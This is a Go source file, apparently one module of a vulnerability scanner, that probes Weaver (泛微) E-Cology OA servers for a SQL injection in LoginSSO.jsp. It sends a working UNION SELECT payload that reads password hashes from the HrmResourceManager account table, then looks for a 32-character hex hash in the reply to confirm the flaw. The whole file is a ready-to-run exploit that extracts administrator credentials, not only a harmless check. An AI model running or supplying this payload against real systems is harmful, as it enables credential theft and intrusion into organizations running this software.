package ecology_loginsso_sqljni

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"regexp"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	vulnUrl := url + "/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).Get(vulnUrl)
	if err != nil {
		color.Red.Println("[-11] 泛微OA E-Cology LoginSSO.jsp SQL注入漏洞不存在")
		return
	}

	body := resp.String()
	// 修改这里的正则表达式来匹配32个十六进制字符
	match, _ := regexp.MatchString(`[0-9A-F]{32}`, body)

	if resp.StatusCode == 200 && match {
		color.Green.Println("[+11] 泛微OA E-Cology LoginSSO.jsp SQL注入漏洞存在 -> ", vulnUrl)
	} else {
		color.Red.Println("[-11] 泛微OA E-Cology LoginSSO.jsp SQL注入漏洞不存在")
	}
}
